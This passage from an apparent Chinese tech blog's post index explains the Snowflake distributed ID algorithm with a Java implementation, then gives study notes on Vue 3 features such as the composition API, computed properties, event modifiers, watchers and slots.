SnowFlow算法是Twitter推出的分布式id生成算法，主要核心思想就是利用64bit的long类型的数字作为全局的id。在分布式系统中经常应用到，并且，在id中加入了时间戳的概念，基本上保持不重复，并且持续一种向上增加的方式。\n在这64bit中，其中第一个bit是不用的，然后用其中的41个bit作为毫秒数，用10bit作为工作机器id,12bit作为序列号.具体如下图所示：\n第一个部分：0,这个是个符号位，因为在二进制中第一个bit如果是1的话，那么都是负数，但是我们生成的这些id都是正数，所以第一个bit基本上都是0 第二个部分：41个bit,代表的是一个时间戳，41bit可以表示的数字多达$2^{41} $-1,也可以表示2^{41}-1 个毫秒值，基本上差不多是69年。 第三个部分：5个bit 表示的是机房id。 第四个部分：5个bit 表示的是机器id。 第五个部分：12个bit 表示的是机房id，表示的序号，就是某个机房某台机器上这一毫秒内同时生成的 id 的序号，0000 00000000，如果是同一毫秒，那么这个雪花值就会递增 简单来说，你的某个服务假设要生成一个全局唯一 id，那么就可以发送一个请求给部署了 SnowFlake 算法的系统，由这个 SnowFlake 算法系统来生成唯一 id。\n这个算法可以保证说，一个机房的一台机器上，在同一毫秒内，生成了一个唯一的 id。可能一个毫秒内会生成多个 id，但是有最后 12 个 bit 的序号来区分开来。\n下面我们就来简单看下这个算法的代码实现部分。\n总之就是用一个64bit的数字中各个bit位置来设置不同的标志位\n2.代码实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 /** * id自增器（雪花算法） * * @author bin * @date 2022/10/11 */ public class SnowFlake { private final static long twepoch = 12888349746579L; // 机器标识位数 private final static long workerIdBits = 5L; // 数据中心标识位数 private final static long datacenterIdBits = 5L; // 毫秒内自增位数 private final static long sequenceBits = 12L; // 机器ID偏左移12位 private final static long workerIdShift = sequenceBits; // 数据中心ID左移17位 private final static long datacenterIdShift = sequenceBits + workerIdBits; // 时间毫秒左移22位 private final static long timestampLeftShift = sequenceBits + workerIdBits + datacenterIdBits; //sequence掩码，确保sequnce不会超出上限 private final static long sequenceMask = -1L ^ (-1L \u0026lt;\u0026lt; sequenceBits); //上次时间戳 private static long lastTimestamp = -1L; //序列 private long sequence = 0L; //服务器ID private long workerId = 1L; private static long workerMask = -1L ^ (-1L \u0026lt;\u0026lt; workerIdBits); //进程编码 private long processId = 1L; private static long processMask = -1L ^ (-1L \u0026lt;\u0026lt; datacenterIdBits); private static SnowFlake snowFlake = null; static{ snowFlake = new SnowFlake(); } public static synchronized long nextId(){ return snowFlake.getNextId(); } private SnowFlake() { //获取机器编码 this.workerId=this.getMachineNum(); //获取进程编码 RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean(); this.processId=Long.valueOf(runtimeMXBean.getName().split(\u0026#34;@\u0026#34;)[0]).longValue(); //避免编码超出最大值 this.workerId=workerId \u0026amp; workerMask; this.processId=processId \u0026amp; processMask; } public synchronized long getNextId() { //获取时间戳 long timestamp = timeGen(); //如果时间戳小于上次时间戳则报错 if (timestamp \u0026lt; lastTimestamp) { try { throw new Exception(\u0026#34;Clock moved backwards. Refusing to generate id for \u0026#34; + (lastTimestamp - timestamp) + \u0026#34; milliseconds\u0026#34;); } catch (Exception e) { e.printStackTrace(); } } //如果时间戳与上次时间戳相同 if (lastTimestamp == timestamp) { // 当前毫秒内，则+1，与sequenceMask确保sequence不会超出上限 sequence = (sequence + 1) \u0026amp; sequenceMask; if (sequence == 0) { // 当前毫秒内计数满了，则等待下一秒 timestamp = tilNextMillis(lastTimestamp); } } else { sequence = 0; } lastTimestamp = timestamp; // ID偏移组合生成最终的ID，并返回ID long nextId = ((timestamp - twepoch) \u0026lt;\u0026lt; timestampLeftShift) | (processId \u0026lt;\u0026lt; datacenterIdShift) | (workerId \u0026lt;\u0026lt; workerIdShift) | sequence; return nextId; } /** * 再次获取时间戳直到获取的时间戳与现有的不同 * @param lastTimestamp * @return 下一个时间戳 */ private long tilNextMillis(final long lastTimestamp) { long timestamp = this.timeGen(); while (timestamp \u0026lt;= lastTimestamp) { timestamp = this.timeGen(); } return timestamp; } private long timeGen() { return System.currentTimeMillis(); } /** * 获取机器编码 * @return */ private long getMachineNum(){ long machinePiece; StringBuilder sb = new StringBuilder(); Enumeration\u0026lt;NetworkInterface\u0026gt; e = null; try { e = NetworkInterface.getNetworkInterfaces(); } catch (SocketException e1) { e1.printStackTrace(); } while (e.hasMoreElements()) { NetworkInterface ni = e.nextElement(); sb.append(ni.toString()); } machinePiece = sb.toString().hashCode(); return machinePiece; } } 使用\n1 Long id = SnowFlake.nextId(); 3.算法优缺点 优点：\n（1）高性能高可用：生成时不依赖于数据库，完全在内存中生成。\n（2）容量大：每秒中能生成数百万的自增ID。\n（3）ID自增：存入数据库中，索引效率高。\n缺点：\n（1）依赖与系统时间的一致性，如果系统时间被回调，或者改变，可能会造成id冲突或者重复(时钟重播造成的id重复问题)\n","permalink":"https://chance7bin.github.io/posts/note/%E9%9B%AA%E8%8A%B1%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3%E5%8F%8Aspringboot%E9%9B%86%E6%88%90/","summary":"参考链接： 快速了解雪花算法详解及spring boot集成 SpringBoot快速开发（六）【雪花算法（snowflake）自增ID】 1.介绍","title":"雪花算法详解及springboot集成"},{"content":" 参考链接：\n一个 Java 猿眼中 Vue3 和 Vue2 的差异\n（建议收藏）Vue3 对比 Vue2.x 差异性、注意点、整体梳理，与React hook比又如何？（面试热点）\nVue2升级到Vue3到底是不是一个正确的选择？(尤雨溪亲自回复解读)\n选项式API和组合式API 选项式 API (Options API) 使用选项式 API，我们可以用包含多个选项的对象来描述组件的逻辑，例如 data、methods 和 mounted。选项所定义的属性都会暴露在函数内部的 this 上，它会指向当前的组件实例。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;script\u0026gt; export default { // data() 返回的属性将会成为响应式的状态 // 并且暴露在 `this` 上 data() { return { count: 0 } }, // methods 是一些用来更改状态与触发更新的函数 // 它们可以在模板中作为事件监听器绑定 methods: { increment() { this.count++ } }, // 生命周期钩子会在组件生命周期的各个不同阶段被调用 // 例如这个函数就会在组件挂载完成后被调用 mounted() { console.log(`The initial count is ${this.count}.`) } } \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;button @click=\u0026#34;increment\u0026#34;\u0026gt;Count is: {{ count }}\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; 组合式 API (Composition API) 通过组合式 API，我们可以使用导入的 API 函数来描述组件逻辑。在单文件组件中，组合式 API 通常会与 \u0026lt;script setup\u0026gt; 搭配使用。这个 setup attribute 是一个标识，告诉 Vue 需要在编译时进行一些处理，让我们可以更简洁地使用组合式 API。比如，\u0026lt;script setup\u0026gt; 中的导入和顶层变量/函数都能够在模板中直接使用。\n下面是使用了组合式 API 与 \u0026lt;script setup\u0026gt; 改造后和上面的模板完全一样的组件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;script setup\u0026gt; import { ref, onMounted } from \u0026#39;vue\u0026#39; // 响应式状态 const count = ref(0) // 用来修改状态、触发更新的函数 function increment() { count.value++ } // 生命周期钩子 onMounted(() =\u0026gt; { console.log(`The initial count is ${count.value}.`) }) \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;button @click=\u0026#34;increment\u0026#34;\u0026gt;Count is: {{ count }}\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; 区别 参考链接\nvue3学习（2）选项式API和组合式API的区别\n响应式 setup() reactive https://blog.csdn.net/weixin_47886687/article/details/112918795\ntoRefs ref 在setup函数中，可以使用ref函数，用于创建一个响应式数据，当数据发生改变时，Vue会自动更新UI\n参考链接：\nVue3.0 reactive()、ref()、unref()、isref()、toRefs()、computed()\nreactive vs ref reactive参数一般接受对象或数组，是深层次的响应式。ref参数一般接收简单数据类型，若ref接收对象为参数，本质上会转变为reactive方法 在JS中访问ref的值需要手动添加.value，访问reactive不需要 响应式的底层原理都是Proxy 计算属性 计算属性缓存 vs 方法 你可能注意到我们在表达式中像这样调用一个函数也会获得和计算属性相同的结果：\n1 \u0026lt;p\u0026gt;{{ calculateBooksMessage() }}\u0026lt;/p\u0026gt; 1 2 3 4 5 6 // 组件中 methods: { calculateBooksMessage() { return this.author.books.length \u0026gt; 0 ? \u0026#39;Yes\u0026#39; : \u0026#39;No\u0026#39; } } 若我们将同样的函数定义为一个方法而不是计算属性，两种方式在结果上确实是完全相同的，然而，不同之处在于计算属性值会基于其响应式依赖被缓存。一个计算属性仅会在其响应式依赖更新时才重新计算。这意味着只要 author.books 不改变，无论多少次访问 publishedBooksMessage 都会立即返回先前的计算结果，而不用重复执行 getter 函数。\n这也解释了为什么下面的计算属性永远不会更新，因为 Date.now() 并不是一个响应式依赖：\n1 2 3 4 5 computed: { now() { return Date.now() } } 相比之下，方法调用总是会在重渲染发生时再次执行函数。\n为什么需要缓存呢？想象一下我们有一个非常耗性能的计算属性 list，需要循环一个巨大的数组并做许多计算逻辑，并且可能也有其他计算属性依赖于 list。没有缓存的话，我们会重复执行非常多次 list 的计算函数，然而这实际上没有必要！如果你确定不需要缓存，那么也可以使用方法调用。\n可写计算属性 计算属性默认仅能通过计算函数得出结果。当你尝试修改一个计算属性时，你会收到一个运行时警告。只在某些特殊场景中你可能才需要用到“可写”的属性，你可以通过同时提供 getter 和 setter 来创建：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 export default { data() { return { firstName: \u0026#39;John\u0026#39;, lastName: \u0026#39;Doe\u0026#39; } }, computed: { fullName: { // getter get() { return this.firstName + \u0026#39; \u0026#39; + this.lastName }, // setter set(newValue) { // 注意：我们这里使用的是解构赋值语法 [this.firstName, this.lastName] = newValue.split(\u0026#39; \u0026#39;) } } } } 现在当你再运行 this.fullName = 'John Doe' 时，setter 会被调用而 this.firstName 和 this.lastName 会随之更新。\n最佳实践 计算函数不应有副作用 计算属性的计算函数应只做计算而没有任何其他的副作用，这一点非常重要，请务必牢记。举例来说，不要在计算函数中做异步请求或者更改 DOM！一个计算属性的声明中描述的是如何根据其他值派生一个值。因此计算函数的职责应该仅为计算和返回该值。在之后的指引中我们会讨论如何使用监听器根据其他响应式状态的变更来创建副作用。\n避免直接修改计算属性值 从计算属性返回的值是派生状态。可以把它看作是一个“临时快照”，每当源状态发生变化时，就会创建一个新的快照。更改快照是没有意义的，因此计算属性的返回值应该被视为只读的，并且永远不应该被更改——应该更新它所依赖的源状态以触发新的计算。\n条件渲染 v-if 和 v-for 警告\n同时使用 v-if 和 v-for 是不推荐的，因为这样二者的优先级不明显。查看风格指南获得更多信息。\n当 v-if 和 v-for 同时存在于一个元素上的时候，v-if 会首先被执行。\n当它们同时存在于一个节点上时，v-if 比 v-for 的优先级更高。这意味着 v-if 的条件将无法访问到 v-for 作用域内定义的变量别名：\n1 2 3 4 5 6 7 \u0026lt;!-- 这会抛出一个错误，因为属性 todo 此时 没有在该实例上定义 --\u0026gt; \u0026lt;li v-for=\u0026#34;todo in todos\u0026#34; v-if=\u0026#34;!todo.isComplete\u0026#34;\u0026gt; {{ todo.name }} \u0026lt;/li\u0026gt; 在外新包装一层 \u0026lt;template\u0026gt; 再在其上使用 v-for 可以解决这个问题 (这也更加明显易读)：\n1 2 3 4 5 \u0026lt;template v-for=\u0026#34;todo in todos\u0026#34;\u0026gt; \u0026lt;li v-if=\u0026#34;!todo.isComplete\u0026#34;\u0026gt; {{ todo.name }} \u0026lt;/li\u0026gt; \u0026lt;/template\u0026gt; 列表渲染 组件上使用 v-for 我们可以直接在组件上使用 v-for，和在一般的元素上使用没有区别 (别忘记提供一个 key)：\n1 \u0026lt;MyComponent v-for=\u0026#34;item in items\u0026#34; :key=\u0026#34;item.id\u0026#34; /\u0026gt; 但是，这不会自动将任何数据传递给组件，因为组件有自己独立的作用域。为了将迭代后的数据传递到组件中，我们还需要传递 props：\n1 2 3 4 5 6 \u0026lt;MyComponent v-for=\u0026#34;(item, index) in items\u0026#34; :item=\u0026#34;item\u0026#34; :index=\u0026#34;index\u0026#34; :key=\u0026#34;item.id\u0026#34; /\u0026gt; 不自动将 item 注入组件的原因是，这会使组件与 v-for 的工作方式紧密耦合。明确其数据的来源可以使组件在其他情况下重用。\n展示过滤或排序后的结果 有时，我们希望显示数组经过过滤或排序后的内容，而不实际变更或重置原始数据。在这种情况下，你可以创建返回已过滤或已排序数组的计算属性。\n举例来说：\n1 2 3 4 5 6 7 8 9 10 data() { return { numbers: [1, 2, 3, 4, 5] } }, computed: { evenNumbers() { return this.numbers.filter(n =\u0026gt; n % 2 === 0) } } 1 \u0026lt;li v-for=\u0026#34;n in evenNumbers\u0026#34;\u0026gt;{{ n }}\u0026lt;/li\u0026gt; 在计算属性不可行的情况下 (例如在多层嵌套的 v-for 循环中)，你可以使用以下方法：\n1 2 3 4 5 6 7 8 9 10 data() { return { sets: [[ 1, 2, 3, 4, 5 ], [6, 7, 8, 9, 10]] } }, methods: { even(numbers) { return numbers.filter(number =\u0026gt; number % 2 === 0) } } 1 2 3 \u0026lt;ul v-for=\u0026#34;numbers in sets\u0026#34;\u0026gt; \u0026lt;li v-for=\u0026#34;n in even(numbers)\u0026#34;\u0026gt;{{ n }}\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; 在计算属性中使用 reverse() 和 sort() 的时候务必小心！这两个方法将变更原始数组，计算函数中不应该这么做。请在调用这些方法之前创建一个原数组的副本：\n1 2 - return numbers.reverse() + return [...numbers].reverse() 事件处理 在内联事件处理器中访问事件参数 有时我们需要在内联事件处理器中访问原生 DOM 事件。你可以向该处理器方法传入一个特殊的 $event 变量，或者使用内联箭头函数：\n1 2 3 4 5 6 7 8 9 \u0026lt;!-- 使用特殊的 $event 变量 --\u0026gt; \u0026lt;button @click=\u0026#34;warn(\u0026#39;Form cannot be submitted yet.\u0026#39;, $event)\u0026#34;\u0026gt; Submit \u0026lt;/button\u0026gt; \u0026lt;!-- 使用内联箭头函数 --\u0026gt; \u0026lt;button @click=\u0026#34;(event) =\u0026gt; warn(\u0026#39;Form cannot be submitted yet.\u0026#39;, event)\u0026#34;\u0026gt; Submit \u0026lt;/button\u0026gt; 1 2 3 4 5 6 7 8 9 methods: { warn(message, event) { // 这里可以访问 DOM 原生事件 if (event) { event.preventDefault() } alert(message) } } 事件修饰符 在处理事件时调用 event.preventDefault() 或 event.stopPropagation() 是很常见的。尽管我们可以直接在方法内调用，但如果方法能更专注于数据逻辑而不用去处理 DOM 事件的细节会更好。\n为解决这一问题，Vue 为 v-on 提供了事件修饰符。修饰符是用 . 表示的指令后缀，包含以下这些：\n.stop .prevent .self .capture .once .passive 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;!-- 单击事件将停止传递 --\u0026gt; \u0026lt;a @click.stop=\u0026#34;doThis\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;!-- 提交事件将不再重新加载页面 --\u0026gt; \u0026lt;form @submit.prevent=\u0026#34;onSubmit\u0026#34;\u0026gt;\u0026lt;/form\u0026gt; \u0026lt;!-- 修饰语可以使用链式书写 --\u0026gt; \u0026lt;a @click.stop.prevent=\u0026#34;doThat\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;!-- 也可以只有修饰符 --\u0026gt; \u0026lt;form @submit.prevent\u0026gt;\u0026lt;/form\u0026gt; \u0026lt;!-- 仅当 event.target 是元素本身时才会触发事件处理器 --\u0026gt; \u0026lt;!-- 例如：事件处理器不来自子元素 --\u0026gt; \u0026lt;div @click.self=\u0026#34;doThat\u0026#34;\u0026gt;...\u0026lt;/div\u0026gt; TIP\n使用修饰符时需要注意调用顺序，因为相关代码是以相同的顺序生成的。因此使用 @click.prevent.self 会阻止元素及其子元素的所有点击事件的默认行为而 @click.self.prevent 则只会阻止对元素本身的点击事件的默认行为。\n按键修饰符 在监听键盘事件时，我们经常需要检查特定的按键。Vue 允许在 v-on 或 @ 监听按键事件时添加按键修饰符。\n1 2 \u0026lt;!-- 仅在 `key` 为 `Enter` 时调用 `submit` --\u0026gt; \u0026lt;input @keyup.enter=\u0026#34;submit\u0026#34; /\u0026gt; 你可以直接使用 KeyboardEvent.key 暴露的按键名称作为修饰符，但需要转为 kebab-case 形式。\n1 \u0026lt;input @keyup.page-down=\u0026#34;onPageDown\u0026#34; /\u0026gt; 在上面的例子中，仅会在 $event.key 为 'PageDown' 时调用事件处理。\n按键别名 Vue 为一些常用的按键提供了别名：\n.enter .tab .delete (捕获“Delete”和“Backspace”两个按键) .esc .space .up .down .left .right 系统按键修饰符 你可以使用以下系统按键修饰符来触发鼠标或键盘事件监听器，只有当按键被按下时才会触发。\n.ctrl .alt .shift .meta 注意\n在 Mac 键盘上，meta 是 Command 键 (⌘)。在 Windows 键盘上，meta 键是 Windows 键 (⊞)。在 Sun 微机系统键盘上，meta 是钻石键 (◆)。在某些键盘上，特别是 MIT 和 Lisp 机器的键盘及其后代版本的键盘，如 Knight 键盘，space-cadet 键盘，meta 都被标记为“META”。在 Symbolics 键盘上，meta 也被标识为“META”或“Meta”。\n举例来说：\n1 2 3 4 5 \u0026lt;!-- Alt + Enter --\u0026gt; \u0026lt;input @keyup.alt.enter=\u0026#34;clear\u0026#34; /\u0026gt; \u0026lt;!-- Ctrl + 点击 --\u0026gt; \u0026lt;div @click.ctrl=\u0026#34;doSomething\u0026#34;\u0026gt;Do something\u0026lt;/div\u0026gt; TIP\n请注意，系统按键修饰符和常规按键不同。与 keyup 事件一起使用时，该按键必须在事件发出时处于按下状态。换句话说，keyup.ctrl 只会在你仍然按住 ctrl 但松开了另一个键时被触发。若你单独松开 ctrl 键将不会触发。\n.exact 修饰符 .exact 修饰符允许控制触发一个事件所需的确定组合的系统按键修饰符。\n1 2 3 4 5 6 7 8 \u0026lt;!-- 当按下 Ctrl 时，即使同时按下 Alt 或 Shift 也会触发 --\u0026gt; \u0026lt;button @click.ctrl=\u0026#34;onClick\u0026#34;\u0026gt;A\u0026lt;/button\u0026gt; \u0026lt;!-- 仅当按下 Ctrl 且未按任何其他键时才会触发 --\u0026gt; \u0026lt;button @click.ctrl.exact=\u0026#34;onCtrlClick\u0026#34;\u0026gt;A\u0026lt;/button\u0026gt; \u0026lt;!-- 仅当没有按下任何系统按键时触发 --\u0026gt; \u0026lt;button @click.exact=\u0026#34;onClick\u0026#34;\u0026gt;A\u0026lt;/button\u0026gt; 鼠标按键修饰符 .left .right .middle 这些修饰符将处理程序限定为由特定鼠标按键触发的事件。\n生命周期 所有生命周期钩子函数的 this 上下文都会自动指向当前调用它的组件实例。注意：避免用箭头函数来定义生命周期钩子，因为如果这样的话你将无法在函数中通过 this 获取组件实例。\n有关所有生命周期钩子及其各自用例的详细信息，请参考生命周期钩子 API 索引。\n侦听器 深层侦听器 watch 默认是浅层的：被侦听的属性，仅在被赋新值时，才会触发回调函数——而嵌套属性的变化不会触发。如果想侦听所有嵌套的变更，你需要深层侦听器：\n1 2 3 4 5 6 7 8 9 10 11 12 export default { watch: { someObject: { handler(newValue, oldValue) { // 注意：在嵌套的变更中， // 只要没有替换对象本身， // 那么这里的 `newValue` 和 `oldValue` 相同 }, deep: true } } } 谨慎使用\n深度侦听需要遍历被侦听对象中的所有嵌套的属性，当用于大型数据结构时，开销很大。因此请只在必要时才使用它，并且要留意性能。\n即时回调的侦听器 watch 默认是懒执行的：仅当数据源变化时，才会执行回调。但在某些场景中，我们希望在创建侦听器时，立即执行一遍回调。举例来说，我们想请求一些初始数据，然后在相关状态更改时重新请求数据。\n我们可以用一个对象来声明侦听器，这个对象有 handler 方法和 immediate: true 选项，这样便能强制回调函数立即执行：\n1 2 3 4 5 6 7 8 9 10 11 12 13 export default { // ... watch: { question: { handler(newQuestion) { // 在组件实例创建时会立即调用 }, // 强制立即执行回调 immediate: true } } // ... } 模板引用 挂载结束后引用都会被暴露在 this.$refs 之上：\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;script\u0026gt; export default { mounted() { this.$refs.input.focus() } } \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;input ref=\u0026#34;input\u0026#34; /\u0026gt; \u0026lt;/template\u0026gt; 注意，你只可以在组件挂载后才能访问模板引用。如果你想在模板中的表达式上访问 $refs.input，在初次渲染时会是 null。这是因为在初次渲染前这个元素还不存在呢！\n组件基础 大小写区分 HTML 标签和属性名称是不分大小写的，所以浏览器会把任何大写的字符解释为小写。这意味着当你使用 DOM 内的模板时，无论是 PascalCase 形式的组件名称、camelCase 形式的 prop 名称还是 v-on 的事件名称，都需要转换为相应等价的 kebab-case (短横线连字符) 形式：\n1 2 3 4 5 6 7 8 // JavaScript 中的 camelCase const BlogPost = { props: [\u0026#39;postTitle\u0026#39;], emits: [\u0026#39;updatePost\u0026#39;], template: ` \u0026lt;h3\u0026gt;{{ postTitle }}\u0026lt;/h3\u0026gt; ` } 1 2 \u0026lt;!-- HTML 中的 kebab-case --\u0026gt; \u0026lt;blog-post post-title=\u0026#34;hello!\u0026#34; @update-post=\u0026#34;onUpdatePost\u0026#34;\u0026gt;\u0026lt;/blog-post\u0026gt; 参考链接：\nDOM 模板解析注意事项\nProps Boolean 类型转换 为了更贴近原生 boolean attributes 的行为，声明为 Boolean 类型的 props 有特别的类型转换规则。以带有如下声明的 \u0026lt;MyComponent\u0026gt; 组件为例：\n1 2 3 4 5 export default { props: { disabled: Boolean } } 该组件可以被这样使用：\n1 2 3 4 5 \u0026lt;!-- 等同于传入 :disabled=\u0026#34;true\u0026#34; --\u0026gt; \u0026lt;MyComponent disabled /\u0026gt; \u0026lt;!-- 等同于传入 :disabled=\u0026#34;false\u0026#34; --\u0026gt; \u0026lt;MyComponent /\u0026gt; 事件 事件校验 和对 props 添加类型校验的方式类似，所有触发的事件也可以使用对象形式来描述。\n要为事件添加校验，那么事件可以被赋值为一个函数，接受的参数就是抛出事件时传入 this.$emit 的内容，返回一个布尔值来表明事件是否合法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 export default { emits: { // 没有校验 click: null, // 校验 submit 事件 submit: ({ email, password }) =\u0026gt; { if (email \u0026amp;\u0026amp; password) { return true } else { console.warn(\u0026#39;Invalid submit event payload!\u0026#39;) return false } } }, methods: { submitForm(email, password) { this.$emit(\u0026#39;submit\u0026#39;, { email, password }) } } } 配合 v-model 使用 https://cn.vuejs.org/guide/components/events.html#usage-with-v-model\n插槽 插槽内容与出口 在之前的章节中，我们已经了解到组件能够接收任意类型的 JavaScript 值作为 props，但组件要如何接收模板内容呢？在某些场景中，我们可能想要为子组件传递一些模板片段，让子组件在它们的组件中渲染这些片段。\n举例来说，这里有一个 \u0026lt;FancyButton\u0026gt; 组件，可以像这样使用：\n1 2 3 \u0026lt;FancyButton\u0026gt; Click me! \u0026lt;!-- 插槽内容 --\u0026gt; \u0026lt;/FancyButton\u0026gt; 而 \u0026lt;FancyButton\u0026gt; 的模板是这样的：\n1 2 3 \u0026lt;button class=\u0026#34;fancy-btn\u0026#34;\u0026gt; \u0026lt;slot\u0026gt;\u0026lt;/slot\u0026gt; \u0026lt;!-- 插槽出口 --\u0026gt; \u0026lt;/button\u0026gt; \u0026lt;slot\u0026gt; 元素是一个插槽出口 (slot outlet)，标示了父元素提供的插槽内容 (slot content) 将在哪里被渲染。\n最终渲染出的 DOM 是这样：\n1 \u0026lt;button class=\u0026#34;fancy-btn\u0026#34;\u0026gt;Click me!\u0026lt;/button\u0026gt; 具名插槽 有时在一个组件中包含多个插槽出口是很有用的。举例来说，在一个 \u0026lt;BaseLayout\u0026gt; 组件中，有如下模板：\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;header\u0026gt; \u0026lt;!-- 标题内容放这里 --\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;main\u0026gt; \u0026lt;!-- 主要内容放这里 --\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;footer\u0026gt; \u0026lt;!-- 底部内容放这里 --\u0026gt; \u0026lt;/footer\u0026gt; \u0026lt;/div\u0026gt; 对于这种场景，\u0026lt;slot\u0026gt; 元素可以有一个特殊的 attribute name，用来给各个插槽分配唯一的 ID，以确定每一处要渲染的内容：\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;header\u0026gt; \u0026lt;slot name=\u0026#34;header\u0026#34;\u0026gt;\u0026lt;/slot\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;main\u0026gt; \u0026lt;slot\u0026gt;\u0026lt;/slot\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;footer\u0026gt; \u0026lt;slot name=\u0026#34;footer\u0026#34;\u0026gt;\u0026lt;/slot\u0026gt; \u0026lt;/footer\u0026gt; \u0026lt;/div\u0026gt; 这类带 name 的插槽被称为具名插槽 (named slots)。没有提供 name 的 \u0026lt;slot\u0026gt; 出口会隐式地命名为“default”。\n在父组件中使用 \u0026lt;BaseLayout\u0026gt; 时，我们需要一种方式将多个插槽内容传入到各自目标插槽的出口。此时就需要用到具名插槽了：\n要为具名插槽传入内容，我们需要使用一个含 v-slot 指令的 \u0026lt;template\u0026gt; 元素，并将目标插槽的名字传给该指令：\n1 2 3 4 5 \u0026lt;BaseLayout\u0026gt; \u0026lt;template v-slot:header\u0026gt; \u0026lt;!-- header 插槽的内容放这里 --\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/BaseLayout\u0026gt; v-slot 有对应的简写 #，因此 \u0026lt;template v-slot:header\u0026gt; 可以简写为 \u0026lt;template #header\u0026gt;。其意思就是“将这部分模板片段传入子组件的 header 插槽中”。\n下面我们给出完整的、向 \u0026lt;BaseLayout\u0026gt; 传递插槽内容的代码，指令均使用的是缩写形式：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;BaseLayout\u0026gt; \u0026lt;template #header\u0026gt; \u0026lt;h1\u0026gt;Here might be a page title\u0026lt;/h1\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;template #default\u0026gt; \u0026lt;p\u0026gt;A paragraph for the main content.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;And another one.\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;template #footer\u0026gt; \u0026lt;p\u0026gt;Here\u0026#39;s some contact info\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/BaseLayout\u0026gt; 当一个组件同时接收默认插槽和具名插槽时，所有位于顶级的非 \u0026lt;template\u0026gt; 节点都被隐式地视为默认插槽的内容。所以上面也可以写成：\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;BaseLayout\u0026gt; \u0026lt;template #header\u0026gt; \u0026lt;h1\u0026gt;Here might be a page title\u0026lt;/h1\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;!-- 隐式的默认插槽 --\u0026gt; \u0026lt;p\u0026gt;A paragraph for the main content.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;And another one.\u0026lt;/p\u0026gt; \u0026lt;template #footer\u0026gt; \u0026lt;p\u0026gt;Here\u0026#39;s some contact info\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/BaseLayout\u0026gt; 现在 \u0026lt;template\u0026gt; 元素中的所有内容都将被传递到相应的插槽。最终渲染出的 HTML 如下：\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;header\u0026gt; \u0026lt;h1\u0026gt;Here might be a page title\u0026lt;/h1\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;main\u0026gt; \u0026lt;p\u0026gt;A paragraph for the main content.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;And another one.\u0026lt;/p\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;footer\u0026gt; \u0026lt;p\u0026gt;Here\u0026#39;s some contact info\u0026lt;/p\u0026gt; \u0026lt;/footer\u0026gt; \u0026lt;/div\u0026gt; 作用域插槽 在上面的渲染作用域中我们讨论到，插槽的内容无法访问到子组件的状态。\n然而在某些场景下插槽的内容可能想要同时使用父组件域内和子组件域内的数据。要做到这一点，我们需要一种方法来让子组件在渲染时将一部分数据提供给插槽。\n我们也确实有办法这么做！可以像对组件传递 props 那样，向一个插槽的出口上传递 attributes：\n1 2 3 4 \u0026lt;!-- \u0026lt;MyComponent\u0026gt; 的模板 --\u0026gt; \u0026lt;div\u0026gt; \u0026lt;slot :text=\u0026#34;greetingMessage\u0026#34; :count=\u0026#34;1\u0026#34;\u0026gt;\u0026lt;/slot\u0026gt; \u0026lt;/div\u0026gt; 当需要接收插槽 props 时，默认插槽和具名插槽的使用方式有一些小区别。下面我们将先展示默认插槽如何接受 props，通过子组件标签上的 v-slot 指令，直接接收到了一个插槽 props 对象：\n1 2 3 \u0026lt;MyComponent v-slot=\u0026#34;slotProps\u0026#34;\u0026gt; {{ slotProps.text }} {{ slotProps.count }} \u0026lt;/MyComponent\u0026gt; 这类能够接受参数的插槽被称为作用域插槽 (scoped slots)，因为它们接受的参数只在该插槽作用域内有效。\n高级列表组件示例 1 2 3 4 5 6 7 8 \u0026lt;FancyList :api-url=\u0026#34;url\u0026#34; :per-page=\u0026#34;10\u0026#34;\u0026gt; 